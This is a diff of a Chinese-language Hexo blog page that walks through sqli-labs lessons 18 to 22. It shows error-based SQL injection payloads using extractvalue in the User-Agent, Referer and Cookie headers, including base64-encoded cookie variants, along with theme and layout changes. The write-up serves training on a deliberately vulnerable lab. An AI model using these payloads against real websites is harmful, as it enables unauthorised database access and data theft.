+<p>在UA头处进行注入 单引号尝试一下：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have <span class="keyword">an</span> error <span class="keyword">in</span> your SQL syntax; check <span class="keyword">the</span> manual that corresponds <span class="built_in">to</span> your MySQL server <span class="built_in">version</span> <span class="keyword">for</span> <span class="keyword">the</span> <span class="literal">right</span> syntax <span class="built_in">to</span> use near <span class="string">'127.0.0.1'</span>, <span class="string">'admin'</span>)<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>然后试试报错注入<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:<span class="symbol">'or</span>  (extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> user()),<span class="number">0</span>x7e))) <span class="keyword">or</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
 <p>成功爆出用户名 剩下的就是常规操作了</p>
 <h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p>只是把注入点换到了Referer头中，其他的完全一样</p>
-<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>登录后看到重点是在cookie里，加入单引号后报错<br>尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=&apos;or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>登录后看到重点是在cookie里，加入单引号后报错<br>尝试：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=<span class="symbol">'or</span>  (extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> user()),<span class="number">0</span>x7e))) <span class="keyword">or</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
 <p>成功 其他的和上面一样</p>
-<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>只是在20题的基础上进行了base64编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=dW5hbWU9J29yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgJzEnPScx</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>20题的基础上，将单引号变成双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=dW5hbWU9Im9yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgIjEiPSIx</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>只是在20题的基础上进行了base64编码<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="attribute">uname</span>=dW5hbWU9J29yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgJzEnPScx</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>20题的基础上，将单引号变成双引号<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=dW5hbWU9Im9yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgIjEiPSIx</span><br></pre></td></tr></table></figure></p>
 <h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3>
       
     </div>
-
-    
-
     
     
     
@@ -467,10 +391,17 @@
   </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
           </div>
+          
+
+
           
 
   
@@ -498,10 +429,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
+            文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
+            站点概览
           </li>
         </ul>
       
@@ -510,55 +441,62 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/images/IMG_4178.JPG"
+                alt="Altm4nz" />
+            
               <p class="site-author-name" itemprop="name">Altm4nz</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">18</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
+          <nav class="site-state motion-element">
 
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                    
-                      
-                    
-                    <span class="site-state-item-count">1</span>
-                    <span class="site-state-item-name">tags</span>
-                  
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
             
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
           
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:872801413@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
           
 
         </div>
@@ -595,20 +533,16 @@
     <footer id="footer" class="footer">
       <div class="footer-inner">
         <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love" id="animate">
+  <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Altm4nz</span>
 
   
-
-  
 </div>
 
 
-
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
@@ -616,13 +550,12 @@
 
 
 
-  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
 
         
-
 
 
 
@@ -642,10 +575,7 @@
     
 
     
-	
-    
 
-    
   </div>
 
   
@@ -664,12 +594,10 @@
 
 
 
+  
 
 
-
-
-
-
+  
 
 
 
@@ -688,6 +616,16 @@
 
   
   
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
     <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
@@ -696,50 +634,78 @@
     <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
-
   
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
-
-
-
   
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
-
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
   
-
-
-
   
 
-
-
-
-
-
-
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
 
 
 
   
 
 
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
 
 
 
@@ -750,12 +716,6 @@
   
 
   
-
-  
-  
-
-  
-
   
 
   
